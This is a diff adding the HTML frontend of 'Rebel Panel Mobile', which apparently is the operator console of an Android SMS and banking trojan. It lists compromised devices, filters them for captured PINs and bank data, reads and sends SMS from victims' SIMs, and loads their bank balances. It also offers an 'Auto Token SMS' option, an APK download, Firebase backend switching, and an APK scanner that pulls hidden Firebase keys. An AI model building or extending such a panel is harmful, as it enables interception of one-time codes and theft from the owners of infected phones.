@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
+<meta name="theme-color" content="#050508"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+<title>Rebel Panel Mobile</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<link rel="stylesheet" href="panel.css"/>
+</head>
+<body>
+
+<!-- APP -->
+<div class="app" id="appShell">
+  <header class="hdr">
+    <div class="hdr-left">
+      <div class="rebel-avatar-sm">
+        <img src="https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
+      </div>
+      <div>
+        <div class="hdr-title">Rebel Mobile</div>
+        <div class="hdr-sub" id="hdrSub">Connecting...</div>
+      </div>
+    </div>
+    <div class="hdr-actions">
+      <a class="apk-dl-btn" href="#" download="RebelPanel-Mobile.apk">📥 APK</a>
+      <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
+      <button class="icon-btn" onclick="refreshData()" title="Refresh">↻</button>
+    </div>
+  </header>
+
+  <div class="screens">
+    <section class="screen active" id="screen-home">
+      <div class="apk-dl-card">
+        <div>
+          <strong>📥 APK Download</strong>
+          <span>Rebel Panel Mobile · v3.0</span>
+        </div>
+        <a href="#" download="RebelPanel-Mobile.apk">Download</a>
+      </div>
+      <div class="stats-row">
+        <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
+        <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
+        <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
+      </div>
+      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
+      <div class="filter-row">
+        <button type="button" class="filter-chip active" data-filter="all" onclick="setDevFilter('all',this)">All</button>
+        <button type="button" class="filter-chip" data-filter="pin" onclick="setDevFilter('pin',this)">🔐 PIN</button>
+        <button type="button" class="filter-chip" data-filter="bank" onclick="setDevFilter('bank',this)">🏦 Bank</button>
+      </div>
+      <div id="devList"></div>
+    </section>
+
+    <section class="screen" id="screen-firebase">
+      <div class="fb-tab-hdr">
+        <h2>Firebase Switch</h2>
+        <p id="fbTabSub">Switch Firebase or view all combined</p>
+      </div>
+      <div id="fbSwitchList"></div>
+    </section>
+
+    <section class="screen" id="screen-device">
+      <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
+      <div id="deviceHero" class="hidden"></div>
+    </section>
+
+    <section class="screen" id="screen-sms">
+      <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
+      <div class="sms-list" id="smsList"></div>
+    </section>
+
+    <section class="screen" id="screen-send">
+      <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
+      <div class="form-card hidden" id="sendForm">
+        <label class="form-label">Send from SIM</label>
+        <div class="sim-selector" id="simSelector">
+          <div class="sim-chip active" data-sim="1" onclick="selectSim(1,this)">SIM 1</div>
+          <div class="sim-chip" data-sim="2" onclick="selectSim(2,this)">SIM 2</div>
+        </div>
+        <label class="form-label">To Number</label>
+        <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
+        <label class="form-label">Message</label>
+        <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
+        <button class="btn-send" onclick="sendSms()">Send SMS</button>
+        <button class="btn-ping" onclick="checkRecharge()">📱 Check Recharge (Ping)</button>
+        <div class="send-status" id="sendStatus"></div>
+      </div>
+    </section>
+
+    <!-- NEW: BANK SECTION -->
+    <section class="screen" id="screen-bank">
+      <div id="bankEmpty" class="bank-empty"><div class="ico">🏦</div>Select a device to load bank balances</div>
+      <div id="bankList"></div>
+    </section>
+
+    <section class="screen" id="screen-more">
+      <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
+      <div class="menu-list">
+        <a class="menu-item" href="#" download="RebelPanel-Mobile.apk" style="text-decoration:none;color:inherit">📥 APK Download <span>v3.0</span></a>
+        <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
+        <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
+        <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
+        <a class="menu-item" href="admin.php" style="text-decoration:none;color:inherit">Admin Panel <span>admin.php →</span></a>
+      </div>
+    </section>
+  </div>
+
+  <nav class="bottom-nav">
+    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
+    <button class="nav-item" data-tab="firebase" onclick="switchTab('firebase',this)"><span class="ico">🔥</span>Firebase</button>
+    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
+    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
+    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
+    <button class="nav-item" data-tab="bank" onclick="switchTab('bank',this)"><span class="ico">🏦</span>Bank</button>
+    <button class="nav-item" data-tab="more" onclick="switchTab('more',this)"><span class="ico">⚙️</span>More</button>
+  </nav>
+</div>
+
+<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
+<div class="sheet" id="fbSheet">
+  <div class="sheet-handle"></div>
+  <div class="sheet-title">Firebase Projects</div>
+  <div id="fbSheetList"></div>
+  <div class="fb-add-form">
+    <div class="apk-upload-box" style="margin-bottom:12px;padding:14px;border:1px dashed var(--border);border-radius:12px;text-align:center;background:rgba(255,255,255,.02)">
+      <input type="file" id="fbApkFile" accept=".apk,.zip,application/vnd.android.package-archive" style="display:none"/>
+      <button type="button" class="btn-add-fb" style="background:var(--surface2);margin-bottom:8px" onclick="document.getElementById('fbApkFile').click()">📦 Upload APK — auto Firebase + API key</button>
+      <div id="fbApkStatus" style="font-size:10px;color:var(--muted);line-height:1.4">Deep scan: DEX, native libs, assets, UTF-16, Base64 — hidden Firebase + API key</div>
+    </div>
+    <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
+    <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
+    <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
+    <input id="fbAddApiKey" placeholder="Web API key (optional — for live updates)"/>
+    <button class="btn-add-fb" type="button" onclick="addFirebaseProject()">+ Add Firebase Project</button>
+  </div>
+</div>
+<div class="toast-wrap" id="toasts"></div>
+
+<script src="firebase_defaults.js"></script>
+<script src="panel-boot.js"></script>
+<script src="panel.js"></script>
+</body>
+</html>
